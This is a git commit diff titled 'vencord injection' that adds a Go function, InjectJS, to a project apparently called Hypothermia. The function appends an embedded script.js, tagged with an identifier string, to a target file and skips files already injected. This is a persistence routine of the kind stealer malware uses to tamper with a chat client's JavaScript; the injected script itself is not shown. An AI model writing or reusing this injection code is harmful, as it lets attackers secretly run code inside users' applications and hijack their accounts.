f028e126bee402643ee7066e1d7e7f117de58b13
chocolate <readonlychocolate@gmail.com>
2025-05-01 13:16:52 +0800

    vencord injection

--- src/utils/persistence/persistence.go
+++ src/utils/persistence/persistence.go
@@ -1,1 +1,38 @@
+package utils_persist
 
+import (
+	"embed"
+	"fmt"
+	"os"
+	"strings"
+
+	"Hypothermia/config"
+)
+
+//go:embed script.js
+var scriptFile embed.FS
+
+func InjectJS(file string) error {
+	data, err := os.ReadFile(file)
+	if err != nil {
+		return err
+	}
+
+	dataStr := string(data)
+	if strings.Contains(dataStr, config.Identifier) {
+		return fmt.Errorf("file already injected")
+	}
+
+	script, err := scriptFile.ReadFile("script.js")
+	if err != nil {
+		return err
+	}
+
+	dataStr += "\n;" + fmt.Sprintf("\"%s\";", config.Identifier) + string(script)
+	err = os.WriteFile(file, []byte(dataStr), 0644)
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
